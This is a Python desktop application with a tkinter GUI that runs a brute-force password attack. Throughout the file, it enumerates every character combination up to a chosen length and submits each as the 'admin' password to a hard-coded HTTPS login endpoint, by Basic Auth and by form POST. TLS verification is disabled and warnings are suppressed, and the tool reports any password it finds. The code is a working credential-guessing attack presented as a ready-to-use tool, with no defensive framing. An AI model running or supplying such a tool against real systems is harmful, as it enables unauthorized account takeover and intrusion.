import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
import threading
import time
import requests
from itertools import product
import string
import json
import os
from datetime import datetime

class BruteForceTool:
    def __init__(self, root):
        self.root = root
        self.root.title("Brute Force Tool - Difai Team")
        self.root.geometry("800x600")
        self.root.configure(bg='#2b2b2b')
        
        # Variables
        self.is_running = False
        self.current_attempt = ""
        self.total_attempts = 0
        self.start_time = None
        self.found_password = None
        
        # Character sets
        self.symbols = string.ascii_uppercase + string.ascii_lowercase + string.digits + "~`!@#$%^&*()_+-={}\"|?><,./\\'[]"
        
        # URL configuration
        self.target_url = "https://difai-team:2096"
        
        self.setup_ui()
        
    def setup_ui(self):
        # Main frame
        main_frame = tk.Frame(self.root, bg='#2b2b2b')
        main_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
        
        # Title
        title_label = tk.Label(main_frame, text="🔐 BRUTE FORCE TOOL", 
                              font=("Arial", 24, "bold"), 
                              fg='#00ff00', bg='#2b2b2b')
        title_label.pack(pady=(0, 20))
        
        # Target info
        target_frame = tk.Frame(main_frame, bg='#2b2b2b')
        target_frame.pack(fill=tk.X, pady=(0, 20))
        
        tk.Label(target_frame, text="🎯 Target URL:", 
                font=("Arial", 12, "bold"), 
                fg='#ffffff', bg='#2b2b2b').pack(anchor=tk.W)
        
        url_label = tk.Label(target_frame, text=self.target_url, 
                            font=("Arial", 10), 
                            fg='#00ff00', bg='#2b2b2b')
        url_label.pack(anchor=tk.W, pady=(5, 0))
        
        # Configuration frame
        config_frame = tk.LabelFrame(main_frame, text="⚙️ Configuration", 
                                    font=("Arial", 12, "bold"),
                                    fg='#ffffff', bg='#2b2b2b', 
                                    relief=tk.RAISED, bd=2)
        config_frame.pack(fill=tk.X, pady=(0, 20))
        
        # Min length
        min_frame = tk.Frame(config_frame, bg='#2b2b2b')
        min_frame.pack(fill=tk.X, padx=10, pady=5)
        
        tk.Label(min_frame, text="Min Length:", 
                font=("Arial", 10), 
                fg='#ffffff', bg='#2b2b2b').pack(side=tk.LEFT)
        
        self.min_length_var = tk.StringVar(value="1")
        min_spinbox = tk.Spinbox(min_frame, from_=1, to=10, 
                                textvariable=self.min_length_var,
                                width=10, bg='#3b3b3b', fg='#ffffff',
                                insertbackground='#ffffff')
        min_spinbox.pack(side=tk.LEFT, padx=(10, 0))
        
        # Max length
        max_frame = tk.Frame(config_frame, bg='#2b2b2b')
        max_frame.pack(fill=tk.X, padx=10, pady=5)
        
        tk.Label(max_frame, text="Max Length:", 
                font=("Arial", 10), 
                fg='#ffffff', bg='#2b2b2b').pack(side=tk.LEFT)
        
        self.max_length_var = tk.StringVar(value="4")
        max_spinbox = tk.Spinbox(max_frame, from_=1, to=10, 
                                textvariable=self.max_length_var,
                                width=10, bg='#3b3b3b', fg='#ffffff',
                                insertbackground='#ffffff')
        max_spinbox.pack(side=tk.LEFT, padx=(10, 0))
        
        # Delay
        delay_frame = tk.Frame(config_frame, bg='#2b2b2b')
        delay_frame.pack(fill=tk.X, padx=10, pady=5)
        
        tk.Label(delay_frame, text="Delay (ms):", 
                font=("Arial", 10), 
                fg='#ffffff', bg='#2b2b2b').pack(side=tk.LEFT)
        
        self.delay_var = tk.StringVar(value="100")
        delay_spinbox = tk.Spinbox(delay_frame, from_=0, to=5000, 
                                  textvariable=self.delay_var,
                                  width=10, bg='#3b3b3b', fg='#ffffff',
                                  insertbackground='#ffffff')
        delay_spinbox.pack(side=tk.LEFT, padx=(10, 0))
        
        # Control buttons
        button_frame = tk.Frame(main_frame, bg='#2b2b2b')
        button_frame.pack(fill=tk.X, pady=(0, 20))
        
        self.start_button = tk.Button(button_frame, text="🚀 START ATTACK", 
                                     command=self.start_attack,
                                     font=("Arial", 12, "bold"),
                                     bg='#00ff00', fg='#000000',
                                     relief=tk.RAISED, bd=3,
                                     width=15, height=2)
        self.start_button.pack(side=tk.LEFT, padx=(0, 10))
        
        self.stop_button = tk.Button(button_frame, text="⏹️ STOP", 
                                    command=self.stop_attack,
                                    font=("Arial", 12, "bold"),
                                    bg='#ff0000', fg='#ffffff',
                                    relief=tk.RAISED, bd=3,
                                    width=15, height=2,
                                    state=tk.DISABLED)
        self.stop_button.pack(side=tk.LEFT, padx=(0, 10))
        
        self.clear_button = tk.Button(button_frame, text="🗑️ CLEAR", 
                                     command=self.clear_log,
                                     font=("Arial", 12, "bold"),
                                     bg='#ffaa00', fg='#000000',
                                     relief=tk.RAISED, bd=3,
                                     width=15, height=2)
        self.clear_button.pack(side=tk.LEFT)
        
        # Status frame
        status_frame = tk.LabelFrame(main_frame, text="📊 Status", 
                                    font=("Arial", 12, "bold"),
                                    fg='#ffffff', bg='#2b2b2b', 
                                    relief=tk.RAISED, bd=2)
        status_frame.pack(fill=tk.X, pady=(0, 20))
        
        # Status labels
        self.status_label = tk.Label(status_frame, text="Status: Ready", 
                                    font=("Arial", 10), 
                                    fg='#00ff00', bg='#2b2b2b')
        self.status_label.pack(anchor=tk.W, padx=10, pady=5)
        
        self.current_attempt_label = tk.Label(status_frame, text="Current: -", 
                                             font=("Arial", 10), 
                                             fg='#ffffff', bg='#2b2b2b')
        self.current_attempt_label.pack(anchor=tk.W, padx=10, pady=5)
        
        self.attempts_label = tk.Label(status_frame, text="Attempts: 0", 
                                      font=("Arial", 10), 
                                      fg='#ffffff', bg='#2b2b2b')
        self.attempts_label.pack(anchor=tk.W, padx=10, pady=5)
        
        self.elapsed_label = tk.Label(status_frame, text="Elapsed: 00:00:00", 
                                     font=("Arial", 10), 
                                     fg='#ffffff', bg='#2b2b2b')
        self.elapsed_label.pack(anchor=tk.W, padx=10, pady=5)
        
        # Log frame
        log_frame = tk.LabelFrame(main_frame, text="📝 Attack Log", 
                                 font=("Arial", 12, "bold"),
                                 fg='#ffffff', bg='#2b2b2b', 
                                 relief=tk.RAISED, bd=2)
        log_frame.pack(fill=tk.BOTH, expand=True)
        
        # Log text area
        self.log_text = scrolledtext.ScrolledText(log_frame, 
                                                 bg='#1e1e1e', fg='#00ff00',
                                                 font=("Consolas", 9),
                                                 insertbackground='#ffffff')
        self.log_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Progress bar
        self.progress = ttk.Progressbar(main_frame, mode='indeterminate')
        self.progress.pack(fill=tk.X, pady=(10, 0))
        
    def log_message(self, message):
        timestamp = datetime.now().strftime("%H:%M:%S")
        log_entry = f"[{timestamp}] {message}\n"
        self.log_text.insert(tk.END, log_entry)
        self.log_text.see(tk.END)
        self.root.update_idletasks()
        
    def clear_log(self):
        self.log_text.delete(1.0, tk.END)
        
    def update_status(self):
        if self.is_running:
            elapsed = time.time() - self.start_time
            hours = int(elapsed // 3600)
            minutes = int((elapsed % 3600) // 60)
            seconds = int(elapsed % 60)
            
            self.elapsed_label.config(text=f"Elapsed: {hours:02d}:{minutes:02d}:{seconds:02d}")
            self.attempts_label.config(text=f"Attempts: {self.total_attempts}")
            self.current_attempt_label.config(text=f"Current: {self.current_attempt}")
            
            if self.is_running:
                self.root.after(1000, self.update_status)
                
    def test_password(self, password):
        """Test a password against the target URL"""
        try:
            # This is a real HTTP request to test the password
            # You may need to adjust the authentication method based on the target
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
            
            # Try different authentication methods
            # Method 1: Basic Auth
            response = requests.get(self.target_url, 
                                  auth=('admin', password),
                                  headers=headers, 
                                  timeout=5,
                                  verify=False)
            
            if response.status_code == 200:
                return True
                
            # Method 2: Form data (if it's a login form)
            login_data = {
                'username': 'admin',
                'password': password,
                'submit': 'Login'
            }
            
            response = requests.post(self.target_url, 
                                   data=login_data,
                                   headers=headers, 
                                   timeout=5,
                                   verify=False)
            
            if response.status_code == 200 and 'error' not in response.text.lower():
                return True
                
            return False
            
        except requests.exceptions.RequestException:
            return False
            
    def brute_force_worker(self):
        """Worker thread for brute force attack"""
        min_len = int(self.min_length_var.get())
        max_len = int(self.max_length_var.get())
        delay = int(self.delay_var.get()) / 1000.0
        
        self.log_message("🚀 Starting brute force attack...")
        self.log_message(f"📊 Target: {self.target_url}")
        self.log_message(f"🔢 Length range: {min_len}-{max_len}")
        self.log_message(f"⏱️ Delay: {delay}s between attempts")
        self.log_message("=" * 50)
        
        for length in range(min_len, max_len + 1):
            if not self.is_running:
                break
                
            self.log_message(f"🎯 Testing passwords with length {length}")
            
            # Generate all possible combinations for current length
            for combo in product(self.symbols, repeat=length):
                if not self.is_running:
                    break
                    
                password = ''.join(combo)
                self.current_attempt = password
                self.total_attempts += 1
                
                # Test the password
                if self.test_password(password):
                    self.found_password = password
                    self.log_message(f"🎉 SUCCESS! Password found: {password}")
                    self.log_message("=" * 50)
                    self.stop_attack()
                    return
                else:
                    if self.total_attempts % 100 == 0:
                        self.log_message(f"⏳ Attempted: {password} (Total: {self.total_attempts})")
                
                # Delay between attempts
                if delay > 0:
                    time.sleep(delay)
        
        if self.is_running:
            self.log_message("❌ Attack completed. Password not found.")
            self.log_message("=" * 50)
            self.stop_attack()
            
    def start_attack(self):
        """Start the brute force attack"""
        if self.is_running:
            return
            
        self.is_running = True
        self.start_time = time.time()
        self.total_attempts = 0
        self.found_password = None
        
        # Update UI
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        self.status_label.config(text="Status: Running", fg='#00ff00')
        self.progress.start()
        
        # Start worker thread
        self.worker_thread = threading.Thread(target=self.brute_force_worker)
        self.worker_thread.daemon = True
        self.worker_thread.start()
        
        # Start status updates
        self.update_status()
        
    def stop_attack(self):
        """Stop the brute force attack"""
        self.is_running = False
        
        # Update UI
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
        self.status_label.config(text="Status: Stopped", fg='#ff0000')
        self.progress.stop()
        
        if self.found_password:
            messagebox.showinfo("Success!", f"Password found: {self.found_password}")
        else:
            self.log_message("⏹️ Attack stopped by user")

def main():
    # Suppress SSL warnings
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    root = tk.Tk()
    app = BruteForceTool(root)
    
    # Center window
    root.update_idletasks()
    width = root.winfo_width()
    height = root.winfo_height()
    x = (root.winfo_screenwidth() // 2) - (width // 2)
    y = (root.winfo_screenheight() // 2) - (height // 2)
    root.geometry(f'{width}x{height}+{x}+{y}')
    
    root.mainloop()

if __name__ == "__main__":
    main()